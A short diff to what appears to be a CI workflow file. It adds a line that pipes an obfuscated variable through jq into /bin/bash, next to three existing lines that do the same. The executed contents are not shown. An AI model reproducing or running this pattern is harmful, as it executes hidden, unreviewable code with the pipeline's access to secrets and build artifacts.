@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$b251" | jq -r .kb2899 | /bin/bash
           printf '%s' "$c0" | jq -r .jel4 | /bin/bash
           printf '%s' "$x9" | jq -r .i5 | /bin/bash
+          echo $n0 | jq -r .dzo2 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
